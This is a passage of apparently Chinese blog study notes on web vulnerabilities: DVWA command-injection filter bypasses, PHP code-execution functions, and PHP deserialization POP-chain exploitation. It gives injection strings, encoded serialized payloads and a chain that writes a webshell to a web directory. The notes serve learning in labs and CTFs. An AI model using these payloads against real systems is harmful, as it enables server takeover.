]  ) ) {     // Get input     $target = $_REQUEST[ &#39;ip&#39; ];     // Set blacklist     $substitutions = array(         &#39;&amp;&amp;&#39; =&gt; &#39;&#39;,         &#39;;&#39;  =&gt; &#39;&#39;,     );     // Remove any of the charactars in the array (blacklist).     $target = str_replace( array_keys( $substitutions ), $substitutions, $target );     // Determine OS and execute the ping command.     if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {         // Windows         $cmd = shell_exec( &#39;ping  &#39; . $target );     }     else {         // *nix         $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );     }     // Feedback for the end user     echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt;</code></pre><p><strong>这里把&amp;&amp;过滤了。。但是我可以使用一个&amp;来绕过。。127.0.0.1&amp;net user</strong></p><p><strong>当然也可以使用 ||  |效果相同</strong></p><h5 id="high"><a href="#high" class="headerlink" title="high:"></a>high:</h5><pre><code>&lt;?php if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {     // Get input     $target = trim($_REQUEST[ &#39;ip&#39; ]);     // Set blacklist     $substitutions = array(         &#39;&amp;&#39;  =&gt; &#39;&#39;,         &#39;;&#39;  =&gt; &#39;&#39;,         &#39;|  &#39; =&gt; &#39;&#39;,         &#39;-&#39;  =&gt; &#39;&#39;,         &#39;$&#39;  =&gt; &#39;&#39;,         &#39;(&#39;  =&gt; &#39;&#39;,         &#39;)&#39;  =&gt; &#39;&#39;,         &#39;`&#39;  =&gt; &#39;&#39;,         &#39;||&#39; =&gt; &#39;&#39;,     );     // Remove any of the charactars in the array (blacklist).     $target = str_replace( array_keys( $substitutions ), $substitutions, $target );     // Determine OS and execute the ping command.     if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {         // Windows         $cmd = shell_exec( &#39;ping  &#39; . $target );     }     else {         // *nix         $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );     }     // Feedback for the end user     echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; </code></pre><p>还是黑名单。。。，发现|符号还是可以使用   所以     <code>127.0.0.1| net user</code> 成功</p><h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><h5 id="什么是代码执行漏洞？"><a href="#什么是代码执行漏洞？" class="headerlink" title="什么是代码执行漏洞？"></a>什么是代码执行漏洞？</h5><p>   当应用在调用一些能够将字符转化为代码的函数（如PHP中的eval)时，没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。</p><h5 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h5><p>PHP:eval()    assert()、  preg_replace() 、 call_user_func() 、  array_map() </p><p>Python:exec</p><p>asp：&lt;%=CreateObject(“wscript.shell”).exec(“cmd.exe /c ipconfig”).StdOut.ReadAll()%&gt;</p><h5 id="漏洞危害：-1"><a href="#漏洞危害：-1" class="headerlink" title="漏洞危害："></a>漏洞危害：</h5><ul><li>执行代码</li><li>让网站写shell</li><li>甚至控制服务器</li></ul><h5 id="常见种类"><a href="#常见种类" class="headerlink" title="常见种类"></a>常见种类</h5><ul><li>代码执行函数</li><li>文件包含代码注入</li><li>正则表达代码注入</li><li>动态代码执行</li><li>其他</li></ul><h5 id="漏洞分类："><a href="#漏洞分类：" class="headerlink" title="漏洞分类："></a>漏洞分类：</h5><p>执行代码的函数：eval、assert</p><p>callback函数：preg_replace + /e模式</p><p>反序列化：unserialize()反序列化</p><h5 id="示例一：php-eval代码执行"><a href="#示例一：php-eval代码执行" class="headerlink" title="示例一：php eval代码执行"></a>示例一：php eval代码执行</h5><p>本地新建test.php</p><img src="QQ截图20200124110825.png" style="zoom:67%;" /><p>我们本地网址执行phpinfo()</p><img src="QQ截图20200124111032.png" style="zoom:67%;" /><h5 id="示例二：-eval闭合代码执行"><a href="#示例二：-eval闭合代码执行" class="headerlink" title="示例二：  eval闭合代码执行"></a>示例二：  eval闭合代码执行</h5><img src="QQ截图20200124111354.png" style="zoom: 80%;" /><p><img src="QQ%E6%88%AA%E5%9B%BE20200124111639.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> web漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码执行/命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化漏洞学习</title>
      <link href="/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/"/>
      <url>/2020/04/03/php-fan-xu-lie-hua-lou-dong-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="反序列化漏洞学习笔记-靶场实战"><a href="#反序列化漏洞学习笔记-靶场实战" class="headerlink" title="反序列化漏洞学习笔记+靶场实战"></a>反序列化漏洞学习笔记+靶场实战</h2><h4 id="反序列化漏洞相关知识点："><a href="#反序列化漏洞相关知识点：" class="headerlink" title="反序列化漏洞相关知识点："></a>反序列化漏洞相关知识点：</h4><p><strong>（引自 i春秋网络安全学院文章）</strong></p><p>什么是反序列化：</p><p>摘自维基百科：序列化（serialization）在计算机科学的数据处理中，是指将数据结构或对象状态转换成可取用格式（例如存成文件，存于缓冲，或经由网络中发送），以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。</p><p>概念很容易理解，其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。</p><p>序列化根据编程语言的不同分为：<strong>php反序列化，Java反序列化，python反序列化。</strong></p><p>在php应用中，序列化和反序列化一般用做缓存，比如<strong>seesion缓存,cookie</strong>等。</p><ul><li>序列化与反序列化与两个函数有关，分别是 <code>serialize()</code>、 <code>unserialize()</code> 这两个函数。</li><li>一般常用于传递 object ,object对象没法直接传值，所以需要先序列化为一段 字符串，接收方接收到后进行反序列化操作后即可得到原object对象。</li><li>当序列化对象时，PHP将试图在序列动作之前调用该对象的成员函数 <em>\</em>sleep() ，这就允许对象在被序列化之前 做任何清除操作。类似的，当使用 unserialize() 恢复对象之前，将调用 __wakeup() 成员函数</li><li>反序列化函数<code>unserialize()</code>接收一个string类型的变量，该值为已序列化后的字符串。</li><li>若被反序列化的变量是一个对象，在成功地重新构造对象之后，PHP会自动地试图去调用 <code>__wakeup()</code> 成员函数 （如果存在的话）。</li></ul><p><strong>常见的序列化格式：</strong></p><ul><li><p>二进制</p></li><li><p>字节数组</p></li><li><p>json字符串</p></li><li><p>xml字符串</p><p><strong>序列化的字符串参数理解：</strong></p><img src="1344396-20181107131554874-1824306350.png" style="zoom:50%;" /><p><strong>PHP序列化与反序列化</strong></p><p>实现函数:<strong>string serialize()</strong>和 <strong>mixed  unserialize()</strong></p><p>我们这里创建了一个对象，并通过serialize序列化后进行了打印；</p><img src="QQ截图20200114102224.png" style="zoom:67%;" /><h5 id="魔术函数（Magic-fucntion"><a href="#魔术函数（Magic-fucntion" class="headerlink" title="魔术函数（Magic fucntion)"></a>魔术函数（Magic fucntion)</h5><p>PHP类中有一种特殊函数体的存在叫<strong>魔法函数</strong>，magic函数命名是以符号__开头的。</p><p>导致php出现反序列化漏洞的<strong>主要原因</strong>就是我们所调用的<strong>魔术函数</strong>：</p><pre><code>__wakeup() //使用unserialize时触发__sleep() //使用serialize时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当脚本尝试将对象调用为函数时触发</code></pre><p>利用代码测试魔术环境：</p><img src="QQ截图20200114005210.png" style="zoom:50%;" /></li></ul><p>运行发现php文件发现</p><img src="QQ截图20200114090134.png" style="zoom:67%;" /><p><strong><strong>_wakeup()会在unserialize()自动调用，     _</strong>destruct会在对象销毁时自动调用</strong></p><p><img src="https://upload-images.jianshu.io/upload_images/9113969-d1181fb9a5ec18b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h4 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h4><h5 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h5><p>PHP反序列化漏洞又称PHP对象注入，可能导致远程代码执行(RCE)，主要原因是程序的输入不当导致。</p><h5 id="漏洞产生的必要条件："><a href="#漏洞产生的必要条件：" class="headerlink" title="漏洞产生的必要条件："></a>漏洞产生的必要条件：</h5><p>1.unserialize函数的变量可控。（还可以结合Phar://协议）</p><p>2.php文件中存在可利用的类，类中有魔术方法。</p><h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h5><p>我们在本地网站新建demo.php</p><img src="QQ截图20200113235252.png" style="zoom:50%;" /><p>我们可以尝试构造一个对象，控制$test的值，达到控制数据流的目的，实现反序列化漏洞的利用</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200113235324.png" alt=""></p><p>在url中填入序列化好的攻击代码，即可利用成功</p><img src="QQ截图20200113235312.png" style="zoom:50%;" /><h5 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h5><p>我们在本地搭建环境后，新建class.php</p><img src="QQ截图20200114102834.png" style="zoom: 67%;" /><p>我们通过控制序列化字符串在本地新建一个shell.php进而打开phpinfo界面；在调用unserialize()时会通过__wakeup()把$test的写入到shell.php中。</p><p>效果如下：</p><img src="QQ截图20200114103132.png" style="zoom:50%;" /><img src="QQ截图20200114103150.png" style="zoom: 25%;" /><h5 id="示例3：（多次调用魔术函数）"><a href="#示例3：（多次调用魔术函数）" class="headerlink" title="示例3：（多次调用魔术函数）"></a>示例3：（多次调用魔术函数）</h5><img src="QQ截图20200114103838.png" style="zoom:67%;" /><p>我们给test传入构造好的序列化字符串后，进行反序列化时自动调用<strong>wakeup()函数，从而在new joker()会自动调用对象joker中的</strong>construct()方法，从而把<?php phpinfo();?>写入到shell.php中：</p><h4 id="PHP反序列化pop链构造"><a href="#PHP反序列化pop链构造" class="headerlink" title="PHP反序列化pop链构造"></a>PHP反序列化pop链构造</h4><h5 id="POP-面向属性编程"><a href="#POP-面向属性编程" class="headerlink" title="POP:面向属性编程"></a>POP:面向属性编程</h5><p>​    面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。</p><h5 id="基本概念："><a href="#基本概念：" class="headerlink" title="基本概念："></a>基本概念：</h5><p>​    在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，当然进行反序列化的数据能够被用户输入所控制。</p><h5 id="POP-CHAIN"><a href="#POP-CHAIN" class="headerlink" title="POP CHAIN:"></a>POP CHAIN:</h5><p>​        把魔术方法作为最开始的小组件，然后在魔术方法中调用其他函数(小组件)，通过寻找相同名字的函数，再与类中的敏感函数和属性相关联，就是POP CHAIN 。此时类中所有的敏感属性都属于可控的。当unserialize()传入的参数可控，便可以通过反序列化漏洞控制POP CHAIN达到利用特定漏洞的效果。</p><p>通俗点就是：反序列化中，如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Smi1e</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$ClassObj</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ClassObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">safe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ClassObj</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">safe</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Here is safe"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">unsafe</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>构造POP链。<br><code>protected $ClassObj = new evil();</code>是不行的，还是要通过<code>__construct</code>来实例化。<br>受保护成员变量含有<code>\0</code>和<code>*</code>需要URL编码一下。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name">Smi1e</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$ClassObj</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ClassObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">unsafe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">unsafe</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token operator">=</span><span class="token string">"phpinfo();"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Smi1e</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>payload:<code>test=O%3A5%3A%22Smi1e%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A6%3A%22unsafe%22%3A1%3A%7Bs%3A12%3A%22%00unsafe%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D</code></p><p><img src="https://upload-images.jianshu.io/upload_images/9113969-8e65abd0d89d46e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h5 id="phpggc："><a href="#phpggc：" class="headerlink" title="phpggc："></a>phpggc：</h5><p>收集了一些常见的PHP框架的通用反序列化的小工具链</p><p><a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">https://github.com/ambionics/phpggc</a></p><p>使用方法参考此文章：</p><p><a href="https://xz.aliyun.com/t/5450" target="_blank" rel="noopener">从0到1掌握反序列化工具之PHPGGC</a></p><h5 id="构造pop链"><a href="#构造pop链" class="headerlink" title="构造pop链"></a>构造pop链</h5><p>首先，如果想要利用php的反序列化漏洞一般需要两个条件：</p><ol><li>unserialize()函数参数可控。(还可以结合Phar://协议)</li><li>魔法方法和危险函数。</li></ol><p>这两个条件都是不言而喻的，反序列化漏洞就是反序列化后魔法方法的执行，导致了魔法方法中的危险函数被执行。</p><p>可是我们常常会发现想要利用的危险函数并不在存在有魔法方法的类中，而此时就是要构造POP链，让没有关系的类扯上关系。</p><h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><p>lemon师傅的例子：</p><pre><code>?phpclass lemon {    protected $ClassObj;    function __construct() {        $this-&gt;ClassObj = new normal();    }    function __destruct() {        $this-&gt;ClassObj-&gt;action();    }}class normal {    function action() {        echo &quot;hello&quot;;    }}class evil {    private $data;    function action() {        eval($this-&gt;data);    }}unserialize($_GET[&#39;d&#39;]);</code></pre><p>可以看到，我们先在evil类中找到了eval危险函数，在lemon类中找到了可以利用的魔法方法<strong>destruct()，怎么利用它俩呢？首先，虽然\</strong>destruct()执行的是normal类的action，但是我们可以看到evil类也有action函数，且eval函数也在evil类的action方法中。</p><p>我们都知道，<strong>construct()函数是在类刚创建时执行的，这意味着即使我们将normal类替换成evil类叶柄不会影响后面的代码，而我们希望在\</strong>destruct中执行的action就变成了evil中的action。</p><p>生成序列化数据：</p><pre><code>&lt;?phpclass lemon {    protected $ClassObj;    function __construct() {        $this-&gt;ClassObj = new evil();    }}class evil {    private $data = &quot;phpinfo();&quot;;}echo urlencode(serialize(new lemon()));</code></pre><p>我们再看一个例子(2019安恒杯1月赛)：</p><pre><code>&lt;?php  @error_reporting(1); include &#39;flag.php&#39;;class baby {       protected $skyobj;      public $aaa;    public $bbb;    function __construct()     {              $this-&gt;skyobj = new sec;    }      function __toString()          {                  if (isset($this-&gt;skyobj))              return $this-&gt;skyobj-&gt;read();          }  }  class cool {        public $filename;         public $nice;    public $amzing;     function read()          {           $this-&gt;nice = unserialize($this-&gt;amzing);        $this-&gt;nice-&gt;aaa = $sth;        if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)        {            $file = &quot;./{$this-&gt;filename}&quot;;                    if (file_get_contents($file))                     {                              return file_get_contents($file);             }              else             {                 return &quot;you must be joking!&quot;;             }            }    }  }  class sec {      function read()         {                  return &quot;it&#39;s so sec~~&quot;;          }  }  if (isset($_GET[&#39;data&#39;]))  {     $Input_data = unserialize($_GET[&#39;data&#39;]);    echo $Input_data; } else {     highlight_file(&quot;./index.php&quot;); } ?&gt; </code></pre><p>这道题其实和上面一题差不多，也是在baby类中的__toString()魔法方法中借用cool类的read()函数读取文件。</p><p>其中这道题还有以下的限制代码</p><pre><code>$this-&gt;nice = unserialize($this-&gt;amzing);$this-&gt;nice-&gt;aaa = $sth;if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)</code></pre><p><code>$sth</code>我们并不知道值，但如果我们事先将bbb的指针指向aaa，那么就一定可以成功了。</p><pre><code>$a = new baby();$a-&gt;bbb = &amp;$a-&gt;aaa;echo urlencode(serialize($a));</code></pre><h5 id="复杂一点的例子"><a href="#复杂一点的例子" class="headerlink" title="复杂一点的例子"></a>复杂一点的例子</h5><p>还是lemon师傅博客中的例子：</p><pre><code>&lt;?phpclass OutputFilter {  protected $matchPattern;  protected $replacement;  function __construct($pattern, $repl) {    $this-&gt;matchPattern = $pattern;    $this-&gt;replacement = $repl;  }  function filter($data) {    return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data);  }};class LogFileFormat {  protected $filters;  protected $endl;  function __construct($filters, $endl) {    $this-&gt;filters = $filters;    $this-&gt;endl = $endl;  }  function format($txt) {    foreach ($this-&gt;filters as $filter) {      $txt = $filter-&gt;filter($txt);    }    $txt = str_replace(&#39;\n&#39;, $this-&gt;endl, $txt);    return $txt;  }};class LogWriter_File {  protected $filename;  protected $format;  function __construct($filename, $format) {    $this-&gt;filename = str_replace(&quot;..&quot;, &quot;__&quot;, str_replace(&quot;/&quot;, &quot;_&quot;, $filename));    $this-&gt;format = $format;  }  function writeLog($txt) {    $txt = $this-&gt;format-&gt;format($txt);    //TODO: Modify the address here, and delete this TODO.    file_put_contents(&quot;/var/log/&quot; . $this-&gt;filename, $txt, FILE_APPEND);  }};class Logger {  protected $logwriter;  function __construct($writer) {    $this-&gt;logwriter = $writer;  }  function log($txt) {    $this-&gt;logwriter-&gt;writeLog($txt);  }};class Song {  protected $logger;  protected $name;  protected $group;  protected $url;  function __construct($name, $group, $url) {    $this-&gt;name = $name;    $this-&gt;group = $group;    $this-&gt;url = $url;    $fltr = new OutputFilter(&quot;/\[i\](.*)\[\/i\]/i&quot;, &quot;&lt;i&gt;\\1&lt;/i&gt;&quot;);    $this-&gt;logger = new Logger(new LogWriter_File(&quot;song_views&quot;, new LogFileFormat(array($fltr), &quot;\n&quot;)));  }  function __toString() {    return &quot;&lt;a href=&#39;&quot; . $this-&gt;url . &quot;&#39;&gt;&lt;i&gt;&quot; . $this-&gt;name . &quot;&lt;/i&gt;&lt;/a&gt; by &quot; . $this-&gt;group;  }  function log() {    $this-&gt;logger-&gt;log(&quot;Song &quot; . $this-&gt;name . &quot; by [i]&quot; . $this-&gt;group . &quot;[/i] viewed.\n&quot;);  }  function get_name() {      return $this-&gt;name;  }}class Lyrics {  protected $lyrics;  protected $song;  function __construct($lyrics, $song) {    $this-&gt;song = $song;    $this-&gt;lyrics = $lyrics;  }  function __toString() {    return &quot;&lt;p&gt;&quot; . $this-&gt;song-&gt;__toString() . &quot;&lt;/p&gt;&lt;p&gt;&quot; . str_replace(&quot;\n&quot;, &quot;&lt;br /&gt;&quot;, $this-&gt;lyrics) . &quot;&lt;/p&gt;\n&quot;;  }  function __destruct() {    $this-&gt;song-&gt;log();  }  function shortForm() {    return &quot;&lt;p&gt;&lt;a href=&#39;song.php?name=&quot; . urlencode($this-&gt;song-&gt;get_name()) . &quot;&#39;&gt;&quot; . $this-&gt;song-&gt;get_name() . &quot;&lt;/a&gt;&lt;/p&gt;&quot;;  }  function name_is($name) {    return $this-&gt;song-&gt;get_name() === $name;  }};class User {  static function addLyrics($lyrics) {    $oldlyrics = array();    if (isset($_COOKIE[&#39;lyrics&#39;])) {      $oldlyrics = unserialize(base64_decode($_COOKIE[&#39;lyrics&#39;]));    }    foreach ($lyrics as $lyric) $oldlyrics []= $lyric;    setcookie(&#39;lyrics&#39;, base64_encode(serialize($oldlyrics)));  }  static function getLyrics() {    if (isset($_COOKIE[&#39;lyrics&#39;])) {      return unserialize(base64_decode($_COOKIE[&#39;lyrics&#39;]));    }    else {      setcookie(&#39;lyrics&#39;, base64_encode(serialize(array(1, 2))));      return array(1, 2);    }  }};class Porter {  static function exportData($lyrics) {    return base64_encode(serialize($lyrics));  }  static function importData($lyrics) {    return serialize(base64_decode($lyrics));  }};class Conn {  protected $conn;  function __construct($dbuser, $dbpass, $db) {    $this-&gt;conn = mysqli_connect(&quot;localhost&quot;, $dbuser, $dbpass, $db);  }  function getLyrics($lyrics) {    $r = array();    foreach ($lyrics as $lyric) {      $s = intval($lyric);      $result = $this-&gt;conn-&gt;query(&quot;SELECT data FROM lyrics WHERE id=$s&quot;);      while (($row = $result-&gt;fetch_row()) != NULL) {        $r []= unserialize(base64_decode($row[0]));      }    }    return $r;  }  function addLyrics($lyrics) {    $ids = array();    foreach ($lyrics as $lyric) {      $this-&gt;conn-&gt;query(&quot;INSERT INTO lyrics (data) VALUES (\&quot;&quot; . base64_encode(serialize($lyric)) . &quot;\&quot;)&quot;);      $res = $this-&gt;conn-&gt;query(&quot;SELECT MAX(id) FROM lyrics&quot;);      $id= $res-&gt;fetch_row(); $ids[]= intval($id[0]);    }    echo var_dump($ids);    return $ids;   }  function __destruct() {    $this-&gt;conn-&gt;close();    $this-&gt;conn = NULL;  }};</code></pre><p>代码这么长啊，放心，通常都会有很多用不到的类，而且一步步的回溯都不困难。</p><p>首先我们先找到能利用的危险函数</p><ul><li>LogWriter_File类中的file_put_contents函数，可以用来写木马。</li><li>OutputFilter类中，由于preg_replace函数pattern可控，如果在php版本不高于5.5的情况下可以执行命令。</li></ul><p>好，这里我就只分析file_put_contents函数写木马的POP链怎么构造。</p><p>​    找到了危险函数就要找可以利用的魔法方法啦，每一个类的魔法方法都一个个的跟踪的话我感觉比较麻烦，我比较喜欢通过危险函数一步步的追溯到可以利用的魔法方法。</p><p>​    首先，file_put_contents函数是在LogWriter_File类的WriteLog方法中的，搜索在Logger类的log方法中执行了WriteLog方法，搜索发现在Song类的log函数执行了Logger类的log方法。最后，在Lyrics类的__destruct魔法方法中执行了Song类的log函数。</p><p>​    理清楚了这个链条，那么我们下一步就是构造反序列化数据并想办法把我们要写的木马内容和地址放在里面，而这个链条的所有类我们只需要考虑相关的类方法，在链条中不存在类方法可以直接注释掉。值得注意的是，这意味着下面的好几个类没有用了。</p><p>​    先把用不到的类和部分类没有用到的方法(没有用到的方法是不用分析的，包括没用的属性)。并且，要知道这些类的__construct()方法仅仅作用在于帮我们构造，如果它们里面存在限制的话我们完全可以删掉。</p><p>​    就比如Song类，其实我们只用到了log函数，再加上__construct方法帮我们构造，其他的函数大可删掉。log()函数用到了<code>$name</code>和<code>$group</code>属性，再加上构造POP链的<code>$logger</code>，剩下<code>$url</code>参数完全可以删掉。精简如下：</p><pre><code>class OutputFilter {  protected $matchPattern;  protected $replacement;  function __construct($pattern, $repl) {    $this-&gt;matchPattern = $pattern;    $this-&gt;replacement = $repl;  }  function filter($data) {    return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data);  }};class LogFileFormat {  protected $filters;  protected $endl;  function __construct($filters, $endl) {    $this-&gt;filters = $filters;    $this-&gt;endl = $endl;  }  function format($txt) {    foreach ($this-&gt;filters as $filter) {      $txt = $filter-&gt;filter($txt);    }    $txt = str_replace(&#39;\n&#39;, $this-&gt;endl, $txt);    return $txt;  }};class LogWriter_File {  protected $filename;  protected $format;  function __construct($filename, $format) {    $this-&gt;format = $format;    $this-&gt;filename = $filename;  }  function writeLog($txt) {    $txt = $this-&gt;format-&gt;format($txt);    //TODO: Modify the address here, and delete this TODO.    file_put_contents(&quot;/var/log/&quot; . $this-&gt;filename, $txt, FILE_APPEND);  }};class Logger {  protected $logwriter;  function __construct($writer) {    $this-&gt;logwriter = $writer;  }  function log($txt) {    $this-&gt;logwriter-&gt;writeLog($txt);  }};class Song {  protected $logger;   protected $name;  protected $group;  function __construct($name, $group, $logger) {    $this-&gt;name = $name;    $this-&gt;group = $group;    $this-&gt;logger = $logger;  }  function log() {    $this-&gt;logger-&gt;log(&quot;Song &quot; . $this-&gt;name . &quot; by [i]&quot; . $this-&gt;group . &quot;[/i] viewed.\n&quot;);  }}class Lyrics {  protected $lyrics;  protected $song;  function __construct($lyrics, $song) {    $this-&gt;song = $song;    $this-&gt;lyrics = $lyrics;  }  function __toString() {    return &quot;&lt;p&gt;&quot; . $this-&gt;song-&gt;__toString() . &quot;&lt;/p&gt;&lt;p&gt;&quot; . str_replace(&quot;\n&quot;, &quot;&lt;br /&gt;&quot;, $this-&gt;lyrics) . &quot;&lt;/p&gt;\n&quot;;  }  function __destruct() {    $this-&gt;song-&gt;log();  }};</code></pre><p>​    到了最后的构造时间，从危险函数开始构造。</p><p>​        首先，file_put_contents函数是在LogWriter_File类的WriteLog方法中的，LogWriter_File类的第一个参数是写入文件的文件名，第二个是LogFileFormat类实例(可以看到，第二个参数返回的是被过滤的写入文件的内容)。LogFileFormat类第一个参数是OutputFilter类实例，第二个是替换’\n’的字符。OutputFilter类第一个参数是pattern，第二个是替换对象，为了不过滤OutputFilter两个参数设置一样的。</p><pre><code>$outputfilter = new OutputFilter(&quot;&quot;, &quot;&quot;);$logfileformat = new LogFileFormat($outputfilter, &quot;\n&quot;);$log_write_file = new LogWriter_File(&#39;../../../../var/www/html/webshell.php&#39;, $logfileformat);</code></pre><p>​    以上再顺便把shell地址改到web目录。</p><p>​    接下来是Logger类用到了LogWriter_File类，只有一个参数正好是LogWrite_Fiel类。</p><pre><code>$logger = new Logger($log_write_file);</code></pre><p>接下来是Song类调用了Logger的log方法，参数便为WriteLog的参数，即为写入文件的内容。最后套如$Lyrics类中。</p><pre><code>$song = new Song(&#39;JrXnm&#39;,&#39;&lt;?php phpinfo() ?&gt; &#39;, $logger);$lyrics = new Lyrics(&#39;JrXnm&#39;,$song);</code></pre><p>最后整体的payload为：</p><pre><code>&lt;?phpclass OutputFilter {  protected $matchPattern;  protected $replacement;  function __construct($pattern, $repl) {    $this-&gt;matchPattern = $pattern;    $this-&gt;replacement = $repl;  }  function filter($data) {    return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data);  }};class LogFileFormat {  protected $filters;  protected $endl;  function __construct($filters, $endl) {    $this-&gt;filters = $filters;    $this-&gt;endl = $endl;  }  function format($txt) {    foreach ($this-&gt;filters as $filter) {      $txt = $filter-&gt;filter($txt);    }    $txt = str_replace(&#39;\n&#39;, $this-&gt;endl, $txt);    return $txt;  }};class LogWriter_File {  protected $filename;  protected $format;  function __construct($filename, $format) {    $this-&gt;format = $format;    $this-&gt;filename = $filename;  }  function writeLog($txt) {    $txt = $this-&gt;format-&gt;format($txt);    //TODO: Modify the address here, and delete this TODO.    file_put_contents(&quot;/var/log/&quot; . $this-&gt;filename, $txt, FILE_APPEND);  }};class Logger {  protected $logwriter;  function __construct($writer) {    $this-&gt;logwriter = $writer;  }  function log($txt) {    $this-&gt;logwriter-&gt;writeLog($txt);  }};class Song {  protected $logger;   protected 